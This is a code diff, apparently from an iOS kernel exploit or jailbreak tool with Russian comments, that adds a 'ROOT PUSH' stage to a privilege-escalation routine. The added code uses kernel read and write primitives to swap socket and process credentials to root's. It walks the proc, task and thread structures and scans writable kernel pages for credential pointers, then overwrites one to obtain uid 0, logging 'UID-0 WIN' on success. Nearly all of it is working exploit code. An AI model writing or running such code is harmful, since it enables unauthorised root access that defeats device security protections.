@@ -2424,10 +2424,23 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             struct sockaddr_in sin; memset(&sin, 0, sizeof(sin));
             sin.sin_family = AF_INET; sin.sin_port = htons(22); sin.sin_addr.s_addr = htonl(INADDR_ANY);
             int pBind = bind(ts, (struct sockaddr *)&sin, sizeof(sin));
+            int eBind = errno;
+            // 2.0.53: пока so_cred=root — raw socket + setuid (может увидеть p_ucred)
+            int rs = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+            int eRaw = errno;
+            uid_t uBefore = getuid(), eBefore = geteuid();
+            int su = setuid(0);
+            int eSu = errno;
+            uid_t uAfter = getuid(), eAfter = geteuid();
             early_kwrite64(sVA + socOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap readback=%#llx → bind22=%d errno=%d → restored — %@",
-                      (unsigned long long)rb, pBind, errno, pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
+            if (rs >= 0) close(rs);
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap readback=%#llx → bind22=%d e=%d raw=%d e=%d setuid0=%d e=%d uid %u→%u euid %u→%u → restored — %@",
+                      (unsigned long long)rb, pBind, eBind, rs, eRaw, su, eSu,
+                      uBefore, uAfter, eBefore, eAfter,
+                      pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
             if (pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN ===");
+            if (rs >= 0) kpNote(r, @"=== RAW-SOCKET WIN ★★ ===");
+            if (uAfter == 0 || eAfter == 0) kpNote(r, @"=== UID-0 WIN ★★★ ===");
         } else {
             kpNote(r, @"  [ATK] step11: SKIPPED — type!=0x21, kwrite запрещён");
         }
@@ -2440,7 +2453,82 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         early_kwrite64(rootRWk + (rootRW & 0x3fff), rootRef0);
         kpNote(r, @"  [ATK] step12: refcount restored");
     }
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK] выше\n"];
+
+    // ---- ROOT PUSH 2.0.53: охота за uid=0 (writable-указатели cred) ----
+    [r appendString:@"=== ROOT PUSH: uid=0 hunt ===\n"];
+    kpNote(r, [NSString stringWithFormat:@"  [RPT] userspace uid=%u euid=%u (proc-cred)", getuid(), geteuid()]);
+    {
+        uint64_t ucPA = kvtophys(curUcred & ~0x3fffULL);
+        uint64_t ftPA = kvtophys(ftVA & ~0x3fffULL);
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred.pagePA=%#llx t=%d  frameTable.pagePA=%#llx t=%d  ucred_rw t=%d",
+                  (unsigned long long)ucPA, ucPA ? kpFrameTypeOf(ucPA) : -1,
+                  (unsigned long long)ftPA, ftPA ? kpFrameTypeOf(ftPA) : -1, myRWt]);
+        uint64_t dump[8];
+        for (int i = 0; i < 8; i++) dump[i] = early_kread64(curUcred + (uint64_t)i * 8);
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred[0..40]= %016llx %016llx %016llx %016llx %016llx %016llx %016llx %016llx",
+                  dump[0],dump[1],dump[2],dump[3],dump[4],dump[5],dump[6],dump[7]]);
+        for (int i = 0; i < 4; i++) dump[i] = early_kread64(myRW + (uint64_t)i * 8);
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred_rw[0..20]= %016llx %016llx %016llx %016llx",
+                  dump[0],dump[1],dump[2],dump[3]]);
+    }
+    // скан writable-страницы proc и threads на указатель curUcred/rootZVA
+    uint64_t hitVA = 0; uint32_t hitOff = 0; int hitT = -1;
+    uint64_t scanBase[6]; int nScan = 0;
+    scanBase[nScan++] = selfProc & ~0x3fffULL;
+    {
+        uint64_t task = 0;
+        uint64_t ro = kp_untag_ptr(early_kread64(selfProc + koffsetof(proc, proc_ro)));
+        if (kpLooksLikeKernelPointer(ro)) task = kp_untag_ptr(early_kread64(ro + off_proc_ro_pr_task));
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] task=%#llx", (unsigned long long)task]);
+        if (kpLooksLikeKernelPointer(task)) {
+            uint64_t head = task + off_task_threads_next;
+            uint64_t e = kp_untag_ptr(early_kread64(head));
+            int guard = 0;
+            while (kpLooksLikeKernelPointer(e) && guard++ < 8) {
+                uint64_t th = e - off_thread_task_threads_next;
+                kpNote(r, [NSString stringWithFormat:@"  [RPT] thread=%#llx", (unsigned long long)th]);
+                if (nScan < 6) scanBase[nScan++] = th & ~0x3fffULL;
+                // thread_ro через tro
+                uint64_t tro = kp_untag_ptr(early_kread64(th + off_thread_t_tro));
+                if (kpLooksLikeKernelPointer(tro) && nScan < 6) scanBase[nScan++] = tro & ~0x3fffULL;
+                e = kp_untag_ptr(early_kread64(e));
+                if (e == head) break;
+            }
+        }
+    }
+    for (int s = 0; s < nScan; s++) {
+        uint64_t page = scanBase[s];
+        uint64_t pa = kvtophys(page);
+        int t = pa ? kpFrameTypeOf(pa) : -1;
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] scan[%d] page=%#llx pa=%#llx t=%d", s, (unsigned long long)page, (unsigned long long)pa, t]);
+        if (t != 0x21) continue;   // только writable
+        for (uint32_t o = 0; o + 8 <= 0x800; o += 8) {
+            uint64_t v = kp_untag_ptr(early_kread64(page + o));
+            if (v == curUcred || v == rootZVA) {
+                hitVA = page + o; hitOff = o; hitT = t;
+                kpNote(r, [NSString stringWithFormat:@"  [RPT] HIT ★ %s at %#llx off=+x%x (page t=%d)",
+                          v == curUcred ? @"curUcred" : @"rootZVA", (unsigned long long)hitVA, o, t]);
+                break;
+            }
+        }
+        if (hitVA) break;
+    }
+    if (hitVA && kpFrameTypeOf(kvtophys(hitVA & ~0x3fffULL)) == 0x21) {
+        uint64_t saved = early_kread64(hitVA);
+        early_kwrite64(hitVA, rootZVA);
+        uint64_t rb = early_kread64(hitVA);
+        uid_t u0 = getuid(), e0 = geteuid();
+        int su = setuid(0);
+        uid_t u1 = getuid(), e1 = geteuid();
+        early_kwrite64(hitVA, saved);
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] cred-slot swap readback=%#llx setuid0=%d uid %u→%u euid %u→%u → restored",
+                  (unsigned long long)rb, su, u0, u1, e0, e1]);
+        if (u1 == 0 || e1 == 0) kpNote(r, @"=== UID-0 WIN ★★★ ===");
+    } else {
+        kpNote(r, @"  [RPT] writable cred-slot не найден — uid сидит в RO (0x18) ucred/proc_ro");
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT] выше\n"];
     return r;
 
 }
